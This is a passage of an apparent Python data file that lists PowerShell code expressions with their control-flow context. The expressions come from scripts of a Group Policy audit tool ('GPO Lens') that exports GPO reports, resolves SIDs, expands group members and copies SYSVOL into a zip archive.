                "foreach ($s in $failedSections)",
            ),
        ),
        (
            'Write-Host " All sections succeeded."',
            (
                "guard if ($DryRun) -> return",
                "else of [($failedSections.Count -gt 0)]",
            ),
        ),
        (
            "New-GpoExportZip -ExportPath $out",
            (
                "guard if ($DryRun) -> return",
                "if (-not $NoZip) after []",
            ),
        ),
        (
            "[System.IO.Compression.ZipFile]::Open($archive, 'Create')",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
            ),
        ),
        (
            "$f.FullName.Substring($rootLen).Replace('\\', '/')",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            "$f.FullName.Substring($rootLen)",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            (
                "[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile( $zip, "
                "$f.FullName, $entryName)"
            ),
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            "$zip.Dispose()",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "finally",
            ),
        ),
        (
            '[System.IO.File]::WriteAllText($testFile, "test")',
            ("try",),
        ),
        (
            "[math]::Round($sysvolSize / 1MB, 2)",
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            "[System.Collections.Generic.List[string]]::new()",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "[System.Collections.Generic.List[string]]::new()",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "[math]::Round(($Section / $totalSections) * 100)",
            (
                "guard if ($DryRun) -> return",
                "function Set-SectionProgress",
            ),
        ),
        (
            "[System.Collections.Generic.List[object]]::new()",
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "$collectionErrors.Add([pscustomobject]@{ GpoId = $null; DisplayName = "
                "'(combined report)'; Stage = 'report-all' Error = $_.Exception.Message })"
            ),
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "[math]::Round(($sectionNum - 1 + ($i / $gpoCount)) / $totalSections * 100)",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
            ),
        ),
        (
            (
                "$collectionErrors.Add([pscustomobject]@{ GpoId = $gpo.Id.Guid; DisplayName = "
                "$gpo.DisplayName; Stage = 'report' Error = $_.Exception.Message })"
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$_.Name.Trim('{}')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            (
                "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ord"
                "inalIgnoreCase)"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$knownIds.Add($g.Id.Guid)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($g in $allGpos)",
            ),
        ),
        (
            "$gpc.Name.Trim('{}')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
            ),
        ),
        (
            "$knownIds.Contains($guid)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
                "if-condition after []",
            ),
        ),
        (
            (
                "$collectionErrors.Add([pscustomobject]@{ GpoId = $guid; DisplayName = "
                "$gpc.displayName; Stage = 'enumerate' Error = 'GPC exists in AD but Get-GPO "
                "could not read it (Authenticated Users Read may be stripped)' })"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
                "if (-not $knownIds.Contains($guid)) after []",
            ),
        ),
        (
            '$successSections.Add("GPO settings (XML reports)")',
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            (
                '$failedSections.Add("GPO settings: $($collectionErrors.Count) GPO(s) could '
                'not be collected (see collection-errors.json)")'
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            '$successSections.Add("GPO metadata")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("GPO metadata: $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("Inheritance (gp-inheritance)")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("Inheritance (gp-inheritance): $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("OU tree")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("OU tree: $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("AD sites")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("AD sites: $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("WMI filters")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("WMI filters: $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            (
                "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ord"
                "inalIgnoreCase)"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "[regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($f in $xmlFiles)",
                "try",
                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
            ),
        ),
        (
            "$allSids.Add($m.Value)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($f in $xmlFiles)",
                "try",
                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
            ),
        ),
        (
            "[regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $metaPath) after []",
                "try",
                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
            ),
        ),
        (
            "$allSids.Add($m.Value)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $metaPath) after []",
                "try",
                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
            ),
        ),
        (
            "$sidObj.Translate([System.Security.Principal.NTAccount])",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
                "try",
            ),
        ),
        (
            "$dom.DNSRoot.Split('.')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            "$dom.DNSRoot.Split('.')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            '$successSections.Add("Principals (SID -> name)")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("Principals (SID -> name): $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("Group membership")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("Group membership: $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("SYSVOL copy (skipped)")',
            (
                "guard if ($DryRun) -> return",
                "if ($SkipSysvol) after []",
            ),
        ),
        (
            (
                "$collectionErrors.Add([pscustomobject]@{ GpoId = $pf.Name.Trim('{}'); "
                "DisplayName = $null; Stage = 'sysvol' Error = $_.Exception.Message })"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "$pf.Name.Trim('{}')",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            '$failedSections.Add("SYSVOL copy: $detail - GPP/cPassword detection will be BLIND")',
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            (
                "$collectionErrors.Add([pscustomobject]@{ GpoId = $null; DisplayName = $null; "
                "Stage = 'sysvol'; Error = $detail })"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            '$successSections.Add("SYSVOL copy ($copiedCount files)")',
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "if ($sysvolErrors -eq 0) after [($policyFolders.Count -eq 0 -or "
                    "$copiedCount -eq 0)]"
                ),
            ),
        ),
        (
            (
                '$failedSections.Add("SYSVOL copy: $sysvolErrors policy folder(s) inaccessible '
                '(see collection-errors.json)")'
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
    ),
    "Export-GroupMembers.ps1": (
        (
            "Get-Content $PrincipalsPath -Raw -Encoding UTF8",
            (),
        ),
        (
            "ConvertFrom-Json",
            (),
        ),
        (
            'Where-Object { $_.Value.type -eq "Group" }',
            (),
        ),
        (
            'Write-Host "Found $($groups.Count) groups to expand"',
            (),
        ),
        (
            'Write-Host " Expanding $name ($sid)..."',
            ("foreach ($grp in $groups)",),
        ),
        (
            "Get-ADGroupMember -Identity $sid -Recursive @adParams -ErrorAction Stop",
            (
                "foreach ($grp in $groups)",
                "try",
            ),
        ),
        (
            'Write-Host " $($memberSids.Count) members"',
            (
                "foreach ($grp in $groups)",
                "try",
            ),
        ),
        (
            'Write-Host " FAIL: $($_.Exception.Message)"',
            (
                "foreach ($grp in $groups)",
                "catch []",
            ),
        ),
        (
            'Get-Date -Format "o"',
            (),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (),
        ),
        (
            "Set-Content $OutputPath -Encoding UTF8",
            (),
        ),
        (
            'Write-Host "Done: $expanded expanded, $failed failed -> $OutputPath"',
            (),
        ),
    ),
    "Export-Principals.ps1": (
        (
            "Test-Path $SddlSource",
            ("if-condition after []",),
        ),
        (
            'Write-Host "Reading SDDL from: $SddlSource"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            'Join-Path $SddlSource "AllGPOs.xml"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            "Test-Path $allXml",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if-condition after []",
            ),
        ),
        (
            'Join-Path $SddlSource "reports"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            "Test-Path $reportsDir",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if-condition after []",
            ),
        ),
        (
            'Get-ChildItem $reportsDir -Filter "*.xml" -ErrorAction SilentlyContinue',
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $reportsDir) after []",
            ),
        ),
        (
            "Get-Content $f -Raw -ErrorAction Stop",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "foreach ($f in $xmlFiles)",
                "try",
            ),
        ),
        (
            'Join-Path $SddlSource "gpo-metadata.json"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            "Test-Path $metaFile",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if-condition after []",
            ),
        ),
        (
            "Get-Content $metaFile -Raw",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $metaFile) after []",
                "try",
            ),
        ),
        (
            'Write-Host "Collecting SDDL from live AD via Get-ADObject..."',
            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
        ),
        (
            "Get-ADDomain @adParams",
            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
        ),
        (
            (
                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                '"(objectClass=groupPolicyContainer)" -Properties nTSecurityDescriptor, '
                "displayName @adParams"
            ),
            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
        ),
        (
            'Write-Host "Found $($allSids.Count) unique SIDs to resolve"',
            (),
        ),
        (
            "Sort-Object",
            ("foreach ($sid in $allSids | Sort-Object)",),
        ),
        (
            "New-Object System.Security.Principal.SecurityIdentifier($sid)",
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "try",
            ),
        ),
        (
            'Write-Host " $sid -> $translated"',
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "try",
            ),
        ),
        (
            'Write-Host " $sid -> (unresolved)"',
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "catch []",
            ),
        ),
        (
            "Where-Object { $_ -match '^S-1-5-21-' -and $principals[$_].type -eq 'Unresolved' }",
            (),
        ),
        (
            'Write-Host "Resolving $($domainSids.Count) domain SIDs via Get-ADObject..."',
            ("if ($domainSids.Count -gt 0) after []",),
        ),
        (
            "Get-ADDomain @adParams",
            (
                "if ($domainSids.Count -gt 0) after []",
                "if (-not $dom) after []",
                "try",
            ),
        ),
        (
            (
                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties objectClass, "
                "sAMAccountName, name @adParams -ErrorAction Stop"
            ),
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
            ),
        ),
        (
            'Write-Host " AD: $sid -> $sam ($ptype)"',
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            'Write-Host " AD resolve failed for $sid : $($_.Exception.Message)"',
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "catch []",
            ),
        ),
        (
            'Get-Date -Format "o"',
            (),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (),
        ),
        (
            "Set-Content $OutputPath -Encoding UTF8",
            (),
        ),
        (
            'Write-Host "Done: $resolved resolved, $unresolved unresolved -> $OutputPath"',
            (),
        ),
        (
            (
                "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ord"
                "inalIgnoreCase)"
            ),
            (),
        ),
        (
            "[regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "foreach ($f in $xmlFiles)",
                "try",
            ),
        ),
        (
            "$allSids.Add($m.Value)",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "foreach ($f in $xmlFiles)",
                "try",
                "foreach ($m in $matches)",
            ),
        ),
        (
            "[regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $metaFile) after []",
                "try",
            ),
        ),
        (
            "$allSids.Add($m.Value)",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $metaFile) after []",
                "try",
                "foreach ($m in $matches)",
            ),
        ),
        (
            "$sd.GetSecurityDescriptorSddlForm()",
            (
                "else of [($SddlSource -and (Test-Path $SddlSource))]",
                "foreach ($gpc in $gpcObjs)",
                "try",
                "if ($sd) after []",
            ),
        ),
        (
            "[regex]::Matches($sddl, 'S-1-[0-9]+-[0-9-]+')",
            (
                "else of [($SddlSource -and (Test-Path $SddlSource))]",
                "foreach ($gpc in $gpcObjs)",
                "try",
                "if ($sd) after []",
            ),
        ),
        (
            "$allSids.Add($m.Value)",
            (
                "else of [($SddlSource -and (Test-Path $SddlSource))]",
                "foreach ($gpc in $gpcObjs)",
                "try",
                "if ($sd) after []",
                "foreach ($m in $matches)",
            ),
        ),
        (
            "$sidObj.Translate([System.Security.Principal.NTAccount])",
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "try",
            ),
        ),
    ),
    "Run-GpoLensCollection.ps1": (
        (
            "Join-Path $PSScriptRoot 'Export-GpoEstate.ps1'",
            (),
        ),
        (
            ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            (),
        ),
        (
            "Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1'",
            (),
        ),
        (
            "Get-Date -Format o",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "Test-Path -LiteralPath $LogPath",
            (
                "function Write-GpoLensCollectionLog",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $LogPath",
            (
                "function Write-GpoLensCollectionLog",
                "if-condition after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $next",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $next -Force -ErrorAction Stop",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if (Test-Path -LiteralPath $next) after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $old",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if-condition after []",
            ),
        ),
        (
            "Move-Item -LiteralPath $old -Destination $next -ErrorAction Stop",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if (Test-Path -LiteralPath $old) after []",
            ),
        ),
        (
            "Add-Type -AssemblyName System.IO.Compression.FileSystem",
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' -ErrorAction Stop",
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            (
                "Where-Object { $_.BaseName -match '^.+-\\d{8}-\\d{6}$' -and (Test-Path "
                "-LiteralPath (Join-Path (Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml') "
                "-PathType Leaf) }"
            ),
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            (
                "Test-Path -LiteralPath (Join-Path (Join-Path $OutputRoot $_.BaseName) "
                "'AllGPOs.xml') -PathType Leaf"
            ),
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "Join-Path (Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml'",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "Join-Path $OutputRoot $_.BaseName",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            (
                "Sort-Object @{ Expression = { $_.BaseName.Substring($_.BaseName.Length - 15) "
                "}; Descending = $true }, Name"
            ),
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            'Write-Warning "Skipping incomplete ZIP (no estate report): $($archive.Name)"',
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "try",
                "else of [($zip.GetEntry('AllGPOs.xml'))]",
            ),
        ),
        (
            'Write-Warning "Skipping unreadable/incomplete ZIP: $($archive.Name)"',
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "catch []",
            ),
        ),
        (
            "Get-Item -LiteralPath $directory -Force",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $directory -Force",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
            ),
        ),
        (
            "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
            ("function Assert-GpoLensCollectionOwner",),
        ),
        (
            "Test-Path -LiteralPath $marker -PathType Leaf",
            (
                "function Assert-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
            ),
        ),
        (
            "Test-Path -LiteralPath $OutputRoot",
            (
                "function Invoke-GpoLensCollection",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $OutputRoot -Force",
            (
                "function Invoke-GpoLensCollection",
                "if-condition after []",
            ),
        ),
        (
            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.lock'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.log'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
            ),
        ),
        (
            "Write-GpoLensCollectionLog @logArgs -Message 'Collection started'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Resolve-Path -LiteralPath $InventoryPath",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "ConvertFrom-Json",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "ForEach-Object { $previous[$_.FullName] = $true }",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "& $CollectorPath -OutputRoot $OutputRoot *>&1",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                "ForEach-Object { Write-GpoLensCollectionLog @logArgs -Message ($_ | "
                "Out-String).TrimEnd() }"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Write-GpoLensCollectionLog @logArgs -Message ($_ | Out-String).TrimEnd()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "Out-String",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Where-Object { -not $previous.ContainsKey($_.FullName) }",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Join-Path $OutputRoot $newest.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
